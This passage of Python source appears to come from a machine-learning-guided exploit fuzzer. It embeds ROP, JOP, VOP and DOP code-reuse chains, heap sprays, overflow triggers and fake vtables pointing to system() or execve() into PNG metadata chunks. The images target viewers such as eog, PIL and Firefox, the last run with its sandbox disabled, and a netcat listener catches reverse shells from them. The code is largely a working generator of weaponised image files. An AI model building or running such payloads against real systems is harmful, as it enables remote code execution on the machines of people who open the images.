        "thumbnail_iend": lambda c, p: inject_thumbnail_metadata(c, p, location="iend"),
        "animation_iend": lambda c, p: inject_animation_metadata(c, p, location="iend"),
        "exif_iend": lambda c, p: inject_exif_metadata(c, p, location="iend"),
        "gamma_iend": lambda c, p: inject_gamma_data(c, p, location="iend"),
    }


def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigger_offset: int = 0, 
                              fuzz_type: str = "default", leaks: Dict = None, payload_offset: int = 0, 
                              chain_base_addr: Optional[int] = None, force_chain_type: Optional[str] = None,
                              viewer_name: Optional[str] = None, unique_id: Optional[str] = None,
                              chunk_injection_strategy: Optional[str] = None) -> bool:
    """Advanced payload injector with ROP/JOP/VOP/DOP support and PNG structure coverage.
    
    Args:
        chunk_injection_strategy: Which PNG chunk structure to target ("text", "thumbnail", 
                                 "animation", "exif", "gamma", "compressed", or None for default).
    """
    arch = "aarch64" if "aarch64" in platform.machine().lower() else "x86_64"
    leaks = leaks or {}
    
    # Determine chain type from leaks, but allow override
    pac_enabled = bool(leaks.get("pac_enabled", False))
    vop_available = bool(leaks.get("gadget_vop_ldr_str_q0") or leaks.get("gadget_vop_fmov"))
    
    if force_chain_type:
        chain_type = force_chain_type
        logger.info(f"Forced chain type: {chain_type}")
    else:
        chain_type = "ROP"  # Default
        if viewer_name == "firefox" and vop_available:
            if pac_enabled:
                chain_type = "PAC_DOP"
                logger.info("Firefox detected with PAC + VOP support - using PAC_DOP chain")
            else:
                chain_type = "VOP"
                logger.info("Firefox detected with VOP available - using VOP chain")
        elif viewer_name == "eog" and vop_available and fuzz_type in ["metadata_trigger", "overflow"]:
            chain_type = "VOP"
            logger.info(f"EOG detected with VOP available - using VOP chain for {fuzz_type}")
        elif vop_available and os.environ.get("FORCE_VOP"):
            chain_type = "VOP"
            logger.info("VOP gadgets detected and FORCE_VOP enabled - using VOP chain")
        elif pac_enabled and fuzz_type in ["uaf", "optimization_bypass"]:
            chain_type = "PAC_ROP"
            logger.info("PAC enabled - using PAC-aware ROP chain")
        elif fuzz_type in ["double_free", "metadata_trigger"]:
            chain_type = "JOP"
            logger.info(f"Fuzz type {fuzz_type} prefers JOP - using JOP chain")
        else:
            logger.info(f"Defaulting to ROP chain for viewer {viewer_name} and fuzz type {fuzz_type}")

    debug_info = {
        "file": os.path.basename(file_path),
        "fuzz_type": fuzz_type,
        "chain_type": chain_type,  # New field tracking which chain was used
        "unique_id": unique_id,
        "attack_chain": [],
        "leaked_addresses": {k: hex(v) if isinstance(v, int) else v for k, v in leaks.items()}
    }

    try:
        orig_payload = payload
        if isinstance(orig_payload, str): 
            orig_payload = orig_payload.encode()
        
        final_payload = orig_payload
        payload_base_addr = leaks.get("payload", 0)
        if leaks.get("system"):
            payload_command_addr = payload_base_addr + 8
        else:
            payload_command_addr = payload_base_addr
        logger.debug(f"Using payload base addr: {hex(payload_base_addr)} command addr: {hex(payload_command_addr)}")
        
        with open(file_path, 'rb') as f:
            content = bytearray(f.read())
        
        iend_index = content.find(IEND_CHUNK)
        if iend_index == -1: 
            return False
        iend_start = iend_index - 4

        # ==================== VOP Chain Injection ====================
        if chain_type == "VOP":
            logger.info("Injecting VOP chain for image parsing bypass...")
            vop_chain = compile_vop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            
            if vop_chain:
                vop_key = b"VOP_Chain"
                vop_data = vop_key + b"\x00" + vop_chain
                vop_chunk = len(vop_data).to_bytes(4, 'big') + b"tEXt" + vop_data + calculate_png_crc(b"tEXt", vop_data)
                content[iend_start:iend_start] = vop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("VOP_LDR_STR_Q0")
                debug_info["attack_chain"].append("VOP_FMOV_STR")
                logger.info("VOP chain injection complete")
            
            # For VOP, also inject a DOP variant as fallback
            dop_chain = compile_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if dop_chain:
                dop_key = b"DOP_Chain"
                dop_data = dop_key + b"\x00" + dop_chain
                dop_chunk = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
                content[iend_start:iend_start] = dop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("DOP_VECTOR_COPY")
                logger.info("DOP fallback chain injected")
        
        # ==================== PAC-Aware ROP Injection ====================
        elif chain_type == "PAC_ROP":
            logger.info("Injecting PAC-aware ROP chain...")
            rop_chain = compile_rop_chain_pac_aware(arch, [], payload_command_addr, leaks, chain_base_addr, pac_enabled=True)
            
            if rop_chain:
                rop_key = b"PAC_ROP"
                rop_data = rop_key + b"\x00" + rop_chain
                rop_chunk = len(rop_data).to_bytes(4, 'big') + b"tEXt" + rop_data + calculate_png_crc(b"tEXt", rop_data)
                content[iend_start:iend_start] = rop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                debug_info["attack_chain"].append("LDRAA_LOAD")
                debug_info["attack_chain"].append("BLRAAZ_BRANCH")
                logger.info("PAC-aware ROP chain injection complete")
            
            if leaks.get("system"):
                final_payload = leaks["system"].to_bytes(8, 'little') + final_payload
        elif chain_type == "PAC_DOP":
            logger.info("Injecting PAC-aware DOP chain...")
            pac_dop_chain = compile_pac_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr, pac_enabled=True)
            if pac_dop_chain:
                pac_dop_key = b"PAC_DOP"
                pac_dop_data = pac_dop_key + b"\x00" + pac_dop_chain
                pac_dop_chunk = len(pac_dop_data).to_bytes(4, 'big') + b"tEXt" + pac_dop_data + calculate_png_crc(b"tEXt", pac_dop_data)
                content[iend_start:iend_start] = pac_dop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("PAC_DOP")
                logger.info("PAC-aware DOP chain injection complete")

            # Fallback to the standard DOP chain if PAC_DOP was not possible
            dop_chain = compile_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if dop_chain and b"PAC_DOP" not in pac_dop_chain:
                dop_key = b"DOP_Chain"
                dop_data = dop_key + b"\x00" + dop_chain
                dop_chunk = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
                content[iend_start:iend_start] = dop_chunk
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("DOP_FALLBACK")
                logger.info("DOP fallback chain injected for PAC_DOP attempt")
        
        # ==================== Standard Fuzz Type Handling ====================
        if fuzz_type == "uaf":
            logger.info("Injecting UAF heapspray...")
            command_buffer = orig_payload.ljust(64, b"\x00")
            payload_addr = leaks.get("payload", 0)
            vtable_ptr = payload_addr.to_bytes(8, 'little') if payload_addr else (0xDEADBEEF).to_bytes(8, 'little')
            
            spray_data = command_buffer + vtable_ptr
            
            num_spray_chunks = 10
            for i in range(num_spray_chunks):
                chunk_data = b"UAF_Spray" + b"\x00" + spray_data + str(i).encode()
                length = len(chunk_data).to_bytes(4, 'big')
                content[iend_start:iend_start] = length + b"tEXt" + chunk_data + calculate_png_crc(b"tEXt", chunk_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
            
            if leaks.get("system"):
                final_payload = leaks["system"].to_bytes(8, 'little') + final_payload
        
        elif fuzz_type == "overflow":
            logger.info("Injecting overflow instrumentation chains (ROP + JOP + DOP + VOP)")

            # ROP chain
            rop_chain = compile_rop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if rop_chain:
                rop_key = b"ROP_Overflow"
                rop_data = rop_key + b"\x00" + rop_chain
                content[iend_start:iend_start] = len(rop_data).to_bytes(4, 'big') + b"tEXt" + rop_data + calculate_png_crc(b"tEXt", rop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("ROP_OVERFLOW")

            # JOP chain
            jop_chain = compile_jop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if jop_chain:
                jop_key = b"JOP_Overflow"
                jop_data = jop_key + b"\x00" + jop_chain
                content[iend_start:iend_start] = len(jop_data).to_bytes(4, 'big') + b"tEXt" + jop_data + calculate_png_crc(b"tEXt", jop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("JOP_OVERFLOW")

            # VOP chain
            vop_chain = compile_vop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if vop_chain:
                vop_key = b"VOP_Overflow"
                vop_data = vop_key + b"\x00" + vop_chain
                content[iend_start:iend_start] = len(vop_data).to_bytes(4, 'big') + b"tEXt" + vop_data + calculate_png_crc(b"tEXt", vop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("VOP_OVERFLOW")

            # DOP chain
            dop_chain = compile_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
            if dop_chain:
                dop_key = b"DOP_Overflow"
                dop_data = dop_key + b"\x00" + dop_chain
                content[iend_start:iend_start] = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                debug_info["attack_chain"].append("DOP_OVERFLOW")

            # Add integer overflow trigger chunk
            w = 0x40000001
            h = 4
            ovf_data = w.to_bytes(4, 'little') + h.to_bytes(4, 'little')
            chunk_type = b"ovfW"
            content[iend_start:iend_start] = len(ovf_data).to_bytes(4, 'big') + chunk_type + ovf_data + calculate_png_crc(chunk_type, ovf_data)
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4

            # For overflow, create proper vtable object structure that png_consumer expects:
            # Bytes 0-63: command string (padded to 64 bytes)
            # Bytes 64-71: vtable pointer (system address)
            if leaks.get("system") or leaks.get("execve"):
                function_addr = leaks.get("system") or leaks.get("execve")
                
                # Pad command to 64 bytes and add vtable pointer at offset 64
                command_padded = orig_payload.ljust(64, b"\x00")
                vtable_pointer = function_addr.to_bytes(8, 'little')
                final_payload = command_padded + vtable_pointer + b"\x00" * (72 - 72)  # 72-byte vtable_obj structure
                
                logger.debug(f"Created vtable_obj: command={len(orig_payload)} bytes, vtable_ptr={hex(function_addr)}")
        
        # ... [rest of fuzz types: double_free, metadata_trigger, generic_viewer, aggressive_viewer] ...
        # (Keep existing code for these)
        
        # Additional instrumentation for double_free/metadata_trigger/uaf/optimization_bypass
        if fuzz_type in ["double_free", "metadata_trigger", "uaf", "optimization_bypass"]:
            for chain_name, chain_func in [
                ("ROP", compile_rop_chain),
                ("JOP", compile_jop_chain),
                ("VOP", compile_vop_chain),
                ("DOP", compile_dop_chain),
            ]:
                chain_payload = chain_func(arch, [], payload_command_addr, leaks, chain_base_addr)
                if chain_payload:
                    chain_key = f"{chain_name}_{fuzz_type}".encode()
                    chain_data = chain_key + b"\x00" + chain_payload
                    chunk_bytes = len(chain_data).to_bytes(4, 'big') + b"tEXt" + chain_data + calculate_png_crc(b"tEXt", chain_data)
                    content[iend_start:iend_start] = chunk_bytes
                    iend_index = content.find(IEND_CHUNK)
                    iend_start = iend_index - 4
                    debug_info["attack_chain"].append(f"{chain_name}_{fuzz_type.upper()}")
                    logger.info(f"Injected fallback {chain_name} chain for {fuzz_type} (system/execve) in addition")

        # ==================== Final Payload Wrapping ====================
        if b"FITNESS_OK" not in final_payload: 
            final_payload += b"\x00FITNESS_OK\n"
        
        trigger_fuzz_types = {"overflow", "double_free", "uaf", "metadata_trigger", "optimization_bypass"}
        if fuzz_type in trigger_fuzz_types:
            trigger_key = b"TriggerPayload"
            trigger_data = trigger_key + b"\x00" + unique_id.encode()
            trigger_len = len(trigger_data).to_bytes(4, 'big')
            trigger_chunk = trigger_len + b"tEXt" + trigger_data + calculate_png_crc(b"tEXt", trigger_data)
            content[iend_start:iend_start] = trigger_chunk
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4
        if fuzz_type == "double_free":
            trigger_key = b"DoubleFree_Trigger"
            trigger_data = trigger_key + b"\x00" + unique_id.encode()
            trigger_len = len(trigger_data).to_bytes(4, 'big')
            trigger_chunk = trigger_len + b"tEXt" + trigger_data + calculate_png_crc(b"tEXt", trigger_data)
            content[iend_start:iend_start] = trigger_chunk
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4

        # Wrap in appropriate chunk type with offset
        p_key = b"INJECTED_PAYLOAD"
        if payload_offset > 0:
            p_data = p_key + b"\x00" + b"A" * payload_offset + final_payload
        else:
            p_data = p_key + b"\x00" + final_payload
        
        # Apply chunk injection strategy if specified
        if chunk_injection_strategy:
            strategies = get_png_chunk_injection_strategies()
            if chunk_injection_strategy in strategies:
                logger.info(f"Applying chunk injection strategy: {chunk_injection_strategy}")
                strategy_func = strategies[chunk_injection_strategy]
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                
                if strategy_func(content, final_payload):
                    debug_info["chunk_injection_strategy"] = chunk_injection_strategy
                    logger.debug(f"Successfully injected into {chunk_injection_strategy} chunk")
                else:
                    logger.warning(f"Failed to inject into {chunk_injection_strategy} chunk, falling back to tEXt")
                    # Fall back to tEXt injection
                    p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
                    iend_index = content.find(IEND_CHUNK)
                    iend_start = iend_index - 4
                    content[iend_start:iend_start] = p_chunk
            else:
                logger.warning(f"Unknown chunk injection strategy: {chunk_injection_strategy}, using default tEXt")
                p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
                iend_index = content.find(IEND_CHUNK)
                iend_start = iend_index - 4
                content[iend_start:iend_start] = p_chunk
        else:
            # Default: tEXt chunk injection
            p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4
            content[iend_start:iend_start] = p_chunk

        iend_index = content.find(IEND_CHUNK)
        iend_start = iend_index - 4
        new_content = content[:iend_start] + content[iend_start:]
        new_content = find_and_update_chunk_crc(new_content, b'IDAT')
        debug_info["chain_type"] = chain_type
 
        with open(file_path, 'wb') as f:
            f.write(new_content)
        
        # ==================== POST-INJECTION VALIDATION & ANALYSIS ====================
        # Validate instrumentation embedding
        validation_result = validate_instrumentation_embedding(file_path, fuzz_type)
        debug_info["instrumentation_validation"] = validation_result
        
        # Analyze trigger-payload alignment
        alignment_analysis = analyze_trigger_payload_alignment(file_path, fuzz_type, trigger_offset)
        debug_info["trigger_alignment"] = alignment_analysis
        
        # Save debug info with all new details
        with open(f"{file_path}.debug", 'w') as f:
            json.dump(debug_info, f, indent=2)
        
        # Log validation results
        if not validation_result["valid"]:
            logger.warning(f"Instrumentation validation failed for {fuzz_type}: {validation_result['issues']}")
        else:
            logger.info(f"Instrumentation validation passed")
        
        if alignment_analysis.get("recommendations"):
            for rec in alignment_analysis["recommendations"]:
                logger.debug(f"Alignment recommendation: {rec}")
        
        logger.info(f"Payload injection successful: {chain_type} chain used")
        return True
    
    except Exception as e:
        logger.error(f"Injection failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False


class UnifiedFuzzer:
    def __init__(self, platform_id: str, use_advisor: bool = False, use_intelligent: bool = False, use_legacy: bool = False):
        self.platform_id = platform_id
        self.use_advisor = use_advisor
        self.use_intelligent = use_intelligent
        self.use_legacy = use_legacy
        # Define the path to the virtual environment python executable
        venv_python = os.path.expanduser("~/nvenv/bin/python")
        self.device = torch.device("cuda" if torch.cuda.is_available() else "mps" if torch.backends.mps.is_available() else  "cpu")
        self.gadget_names = ["pop_x0_x1_ret", "ldr_x0_x1_br_x0", "vop_ldr_str_q0", "pacia_x30", "autia_x30", "ldraa_x0_x1", "blraa_x0", "vop_ldr_d0_x1", "vop_str_d0_x0"]
        self.address_samples = []
        self.use_oracle = True
        self.oracle_accuracy = 0.0
        self.viewers = [
            {"name": "png_consumer", "cmd": ["./png_consumer"]},
            {"name": "eog", "cmd": ["/usr/bin/eog"]},
            {"name": "firefox", "cmd": ["/snap/bin/firefox", "--headless", "-chrootClient", "0", "-sandboxreporter", "--disable-sandbox", "--no-remote"]},
            {"name": "PIL", "cmd": [venv_python, "pil_loader.py"]} # Ensure absolute path for venv python
        ]
        address_feature_dim = 25 + ELF_FEATURE_VECTOR_SIZE + len(self.viewers) + 3
        self.oracle = AddressOracle(address_feature_dim, len(self.gadget_names))
        # Try to load saved Oracle from common model locations
        oracle_candidates = find_pretrained_model_paths(model_names=["address_oracle.pth", "address_oracle_old.pth"])
        if not oracle_candidates:
            oracle_candidates = [os.path.join(ROOT_DIR, "models", "address_oracle.pth")]
        for oracle_path in oracle_candidates:
            try:
                if os.path.exists(oracle_path):
                    self.oracle.load_state_dict(torch.load(oracle_path, map_location=self.device))
                    self.use_oracle = True
                    self.oracle_accuracy = 1.0
                    logger.info(f"Loaded AddressOracle model from {oracle_path}")
                    break
            except Exception as e:
                logger.info(f"Failed to load AddressOracle model from {oracle_path}: {e}")
        else:
            logger.info("No AddressOracle model found or failed to load; continuing without oracle")
        self.png_consumer_successes = []
        self.leaks = leak_addresses()
        self.weaknesses = ["optimization_bypass", "uaf", "overflow", "metadata_trigger", "generic_viewer", "aggressive_viewer", "double_free"]
        self.fuzz_types_for_ml = sorted(list(set(self.weaknesses))) # Unique sorted list of fuzz types
        self.chain_types_for_ml = ["ROP", "JOP", "DOP", "VOP"] # Initialize chain types for ML
        self.max_payload_offset = 16384 # Max expected payload offset for normalization , reconsider, doesn't make sense.
        self.max_trigger_offset = 16384 # Max expected trigger offset for normalization , reconsider, doesn't make sense( large images, struct jumps, etc...)


        # Netcat monitoring and persistence for reverse shell payloads
        self.netcat_process = None
        self.netcat_output_file = ""
        self.netcat_log_dir = os.path.join(ROOT_DIR, "logs", "files", "netcat")
        self.netcat_log_f = None
        self.netcat_port = 24444
        #self.ensure_netcat_listener()
        
        # Track VOP/DOP success on png_consumer to upgrade payloads for other viewers
        self.png_consumer_vop_dop_success = False
        
        self.ml_model: Optional[VAEGAN] = None
        self.data_processor = None # data_processor module
        self.crash_monitor_last_read_pos = 0 # For /var/log/apport.log

    def predict_gadget_addresses(self, pid, elf_features, viewer_name):
        # Allow prioritization via environment variable PRIORITIZE_CHAIN (e.g., 'VOP')
        prioritize_chain = os.environ.get('PRIORITIZE_CHAIN', '').strip()
        if prioritize_chain:
            logger.info(f"PRIORITIZE_CHAIN set to '{prioritize_chain}'. Adjusting fuzz order and chain types.")
            # If user wants VOP prioritized, ensure 'vop' is attempted first in weaknesses and chain types include it
            if prioritize_chain.lower() == 'vop':
                if 'vop' not in self.weaknesses:
                    self.weaknesses.insert(0, 'vop')
                if 'VOP' not in self.chain_types_for_ml:
                    # Place VOP at front for priority in predictions generation
                    self.chain_types_for_ml.insert(0, 'VOP')

        if not self.use_oracle or self.oracle is None:
            logger.warning("AddressOracle model not available, skipping address prediction")
            return {}
        try:
            viewer_names = [viewer['name'] for viewer in self.viewers]
            features = collect_address_features(pid, elf_features, viewer_name, viewer_names)
            predicted_addrs = predict_addresses(self.oracle, features, device=self.device)
            return dict(zip(self.gadget_names, predicted_addrs))
        except Exception as e:
            logger.warning(f"Failed to predict addresses: {e}")
            return {}

    def ensure_netcat_listener(self):
        """Keep a persistent netcat listener running and ensure log file path exists."""
        if self.netcat_process and self.netcat_process.poll() is None:
            return self.netcat_process, self.netcat_output_file, self.netcat_log_f

        os.makedirs(self.netcat_log_dir, exist_ok=True)
        self.netcat_process, self.netcat_output_file, self.netcat_log_f = start_netcat_listener(port=self.netcat_port, log_dir=self.netcat_log_dir)
        return self.netcat_process, self.netcat_output_file, self.netcat_log_f

    def ensure_netcat_listener_state(self):
        return ensure_netcat_listener_state(self)

    def cleanup_netcat_listener(self):
        """Clean up the persistent netcat listener process."""
        if self.netcat_process:
            try:
                self.netcat_process.terminate()
                self.netcat_process.wait(timeout=5)
                logger.info("Netcat listener process terminated successfully")
            except subprocess.TimeoutExpired:
                logger.warning("Netcat listener did not terminate gracefully, killing...")
                self.netcat_process.kill()
                self.netcat_process.wait()
                logger.info("Netcat listener process killed")
            except Exception as e:
                logger.error(f"Error terminating netcat listener: {e}")
            finally:
                self.netcat_process = None
                self.netcat_output_file = None
                if self.netcat_log_f:
                    try:
                        self.netcat_log_f.close()
                    except Exception:
                        pass
                    self.netcat_log_f = None

    def _scan_viewer_crash_logs(self, viewer_output_dir: str) -> bool:
        """Check viewer output directory for crash indications in .log/.debug/.crash files."""
        if not os.path.isdir(viewer_output_dir):
            return False

        crash_found = False
        for filename in os.listdir(viewer_output_dir):
            if not filename.lower().endswith(('.log', '.debug', '.crash', '.txt')):
                continue
            path = os.path.join(viewer_output_dir, filename)
            try:
                with open(path, 'r', errors='ignore') as f:
                    text = f.read()
                if re.search(r"\b(crash|segfault|abort|panic|exception|fault|invalid|failed)\b", text, re.IGNORECASE):
                    crash_found = True
                    break
                if filename.lower().endswith(('.debug', '.crash')):
                    crash_found = True
                    break
            except Exception:
                continue

        return crash_found

    def _load_previous_trajectory_rows(self, target_base_dir: str) -> List[Dict]:
        csv_path = os.path.join(target_base_dir, 'fuzzing_trajectory.csv')
        if not os.path.exists(csv_path):
            return []

        rows = []
        try:
            with open(csv_path, newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    rows.append(row)
        except Exception as e:
            logger.warning(f"Unable to read previous trajectory CSV {csv_path}: {e}")
        return rows

    def _write_trajectory_rows(self, target_base_dir: str, rows: List[Dict]):
        csv_path = os.path.join(target_base_dir, 'fuzzing_trajectory.csv')
        if not rows:
            return

        fieldnames = rows[0].keys()
        try:
            with open(csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                for row in rows:
                    writer.writerow(row)
            logger.info(f"Updated previous trajectory carousel at {csv_path} ({len(rows)} rows)")
        except Exception as e:
            logger.error(f"Failed to rewrite trajectory CSV {csv_path}: {e}")

    def _count_previous_successes(self, rows: List[Dict]) -> Dict[str, Dict[str, Dict[str, int]]]:
        counts = {}
        for row in rows:
            status = str(row.get('status', '')).strip().upper()
            payload_validated = str(row.get('payload_validated', '')).strip().lower()
            if payload_validated in ('1', 'true', 'yes') or status in ('SUCCESS', 'TRIGGERED', 'PAYLOAD_EXECUTED', 'CRASHED_INFERRED'):
                viewer = row.get('viewer', 'unknown')
                method = 'unknown'
                reason = str(row.get('reason', '')).lower()
                if 'netcat' in reason or 'rshell' in reason or 'reverse shell' in reason:
                    method = 'rshell'
                elif 'syslog' in reason or 'journalctl' in reason:
                    method = 'syslog'
                elif 'vop' in reason or 'rop' in reason or 'jop' in reason or 'dop' in reason:
                    method = reason if reason in ('rop', 'jop', 'vop', 'dop') else 'chain'
                else:
                    method = 'other'

                fuzz_type = row.get('fuzz_type', 'unknown').upper() or 'UNKNOWN'
                counts.setdefault(viewer, {}).setdefault(method, {}).setdefault(fuzz_type, 0)
                counts[viewer][method][fuzz_type] += 1
        return counts

    def _parse_latest_netcat_entries(self, check_last_n: int = 3) -> Dict[str, int]:
        if not os.path.isdir(self.netcat_log_dir):
            return {}

        log_files = sorted(
            [os.path.join(self.netcat_log_dir, p) for p in os.listdir(self.netcat_log_dir) if p.startswith('netcat_') and p.endswith('.log')],
            key=lambda p: os.path.getmtime(p)
        )

        if not log_files:
            return {}

        interesting_files = log_files[-check_last_n:]
        unique_ids = set()
        for path in interesting_files:
            try:
                with open(path, 'r', errors='ignore') as f:
                    text = f.read()
                for m in re.finditer(r"([A-Za-z0-9_\-]{8,})", text):
                    token = m.group(1)
                    if token and len(token) >= 8:
                        unique_ids.add(token)
            except Exception:
                continue

        return {'unique_payloads': len(unique_ids), 'files_scanned': len(interesting_files)}

    def _reconcile_previous_run_state(self, target_base_dir: str):
        rows = self._load_previous_trajectory_rows(target_base_dir)
        if not rows:
            logger.info('No previous trajectory file found, starting fresh.')
            return

        per_viewer_crash = {}
        for viewer in self.viewers:
            viewer_dir = os.path.join(target_base_dir, viewer['name'])
            per_viewer_crash[viewer['name']] = self._scan_viewer_crash_logs(viewer_dir)

        self.inferred_crashed_trajectories = set()
        any_updates = False
        for row in rows:
            status = str(row.get('status', '')).strip().upper()
            viewer_name = row.get('viewer', '')
            key = (row.get('original_file', ''), viewer_name, row.get('fuzz_type', ''))
            if status in ('NOT_TRIGGERED', 'UNKNOWN', 'UNTRIGGERED', '') and per_viewer_crash.get(viewer_name, False):
                row['status'] = 'CRASHED_INFERRED'
                row['reason'] = 'Inferred from crash logs in previous run; should retry instrumentation.'
                self.inferred_crashed_trajectories.add(key)
                any_updates = True

        if any_updates:
            self._write_trajectory_rows(target_base_dir, rows)

        success_counts = self._count_previous_successes(rows)
        netcat_stats = self._parse_latest_netcat_entries()

        logger.info('Previous run trajectory summary (pre-run):')
        logger.info(json.dumps(success_counts, indent=2))
        logger.info(f"Netcat recent payload signatures: {netcat_stats}")

        return {
            'rows': rows,
            'success_counts': success_counts,
            'netcat_stats': netcat_stats,
            'recon_updates': any_updates
        }

    def _find_all_trajectory_directories(self) -> List[str]:
        """Scan for all previous trajectory directories (fuzz_results_single, infected_media_unified_*)."""
        dirs = []
        cwd = os.getcwd()
        
        # Check for fuzz_results_single (standard --single output)
        if os.path.isdir(os.path.join(cwd, 'fuzz_results_single')):
            dirs.append('fuzz_results_single')
        
        # Check for infected_media_unified_* directories (platform runs)
        for entry in os.listdir(cwd):
            if entry.startswith('infected_media_unified_') and os.path.isdir(os.path.join(cwd, entry)):
                dirs.append(entry)
        
        return dirs

    def _reconcile_all_previous_runs(self):
        """Reconcile all previous trajectory contexts (--single and --platform runs)."""
        all_dirs = self._find_all_trajectory_directories()
        if not all_dirs:
            logger.info('No previous trajectory directories found, starting fresh.')
            return {}

        logger.info('Found previous trajectory directories: %s', all_dirs)
        
        self.inferred_crashed_trajectories = set()
        all_success_counts = {}
        all_netcat_stats = {}
        all_recon_updates = 0

        for traj_dir in all_dirs:
            logger.info('Reconciling trajectory from: %s', traj_dir)
            result = self._reconcile_previous_run_state(traj_dir)
            
            if result:
                # Merge success counts per viewer/method
                for viewer, methods in result.get('success_counts', {}).items():
                    if viewer not in all_success_counts:
                        all_success_counts[viewer] = {}
                    for method, fuzz_types in methods.items():
                        if method not in all_success_counts[viewer]:
                            all_success_counts[viewer][method] = {}
                        for fuzz_type, count in fuzz_types.items():
                            all_success_counts[viewer][method][fuzz_type] = all_success_counts[viewer][method].get(fuzz_type, 0) + count
                
                # Track netcat stats from each context
                all_netcat_stats[traj_dir] = result.get('netcat_stats', {})
                
                if result.get('recon_updates'):
                    all_recon_updates += 1

        logger.info('=== RECONCILIATION SUMMARY ACROSS ALL TRAJECTORIES ===')
        logger.info('Total directories reconciled: %d', len(all_dirs))
        logger.info('Directories with updates: %d', all_recon_updates)
        logger.info('Aggregated success metrics: %s', json.dumps(all_success_counts, indent=2))
        logger.info('Netcat stats by directory: %s', json.dumps(all_netcat_stats, indent=2))
        
        return {
            'all_dirs': all_dirs,
            'aggregated_success_counts': all_success_counts,
            'aggregated_netcat_stats': all_netcat_stats,
            'inferred_trajectories_to_retry': len(self.inferred_crashed_trajectories),
            'total_reconciled_updates': all_recon_updates
        }
        self.lime_explainer_payload_offset: Optional[LimeExplainer] = None

        if self.use_intelligent or self.use_advisor:
            logger.info("Intelligent/Advisor mode enabled. Initializing ML components.")
            os.makedirs("runs/fuzzing", exist_ok=True)
            os.makedirs("models", exist_ok=True)
            
            dummy_sample = FuzzingSample(
                viewer_name="dummy", fuzz_type="dummy", file_features=[0.0] * 10, # Updated to match _extract_file_features output
                payload_offset_attempted=0, status_one_hot=[0.0, 0.0, 0.0, 0.0, 0.0],
                gdb_crash_features=[0.0] * 5, leaked_addresses_features=[0.0] * 3,
                apport_crash_features=[0.0] * 5, success_label=0,
                trigger_offset_attempted=0, # New field
                elf_features=[0.0] * ELF_FEATURE_VECTOR_SIZE # New field
            )
            calculated_input_dim = (
                len(dummy_sample.file_features) +
                len(dummy_sample.status_one_hot) +
                len(dummy_sample.gdb_crash_features) +
                len(dummy_sample.leaked_addresses_features) +
                len(dummy_sample.apport_crash_features) +
                len(dummy_sample.elf_features) + # New: for elf_features
                1 + # for normalized_payload_offset
                1   # for normalized_trigger_offset
            )
            
            # Calculate output_dim based on fuzz_types and chain_types
            calculated_output_dim = len(self.fuzz_types_for_ml) + len(self.chain_types_for_ml) + 2
            self.ml_model = VAEGAN(input_dim=calculated_input_dim, latent_dim=20, output_dim=calculated_output_dim)
            self.device = "cuda" if torch.cuda.is_available() else "cpu"
            self.ml_model.to(self.device)
            
            vae_candidates = find_pretrained_model_paths(model_names=["vaegan_fuzzer_model.pth", "vaegan_model.pth", "vaegan.pth"])
            if not vae_candidates:
                vae_candidates = [os.path.join(ROOT_DIR, "models", "vaegan_fuzzer_model.pth")]
            loaded_model = False
            for model_path in vae_candidates:
                if not os.path.exists(model_path):
                    continue
                try:
                    self.ml_model.load_state_dict(torch.load(model_path, map_location=self.device), strict=False)
                    logger.info(f"Loaded pre-trained VAEGAN model from {model_path} (strict=False to allow size mismatches).")
                    loaded_model = True
                    break
                except Exception as e:
                    logger.error(f"Failed to load VAEGAN model from {model_path}: {e}")
            if not loaded_model:
                logger.warning("No pre-trained VAEGAN model found. Model will be trained if data is available.")

    def train_ml_model(self, data_dirs: List[str], epochs: int = 10, generate_lime_explanations: bool = False): # Added epochs and generate_lime_explanations parameter
        """Orchestrates the training of the VAE/GAN model."""
        if not (self.use_intelligent or self.use_advisor):
            logger.warning("ML model training skipped: Intelligent/Advisor mode not enabled.")
            return

        logger.info(f"Loading and processing historical data from {data_dirs}...")
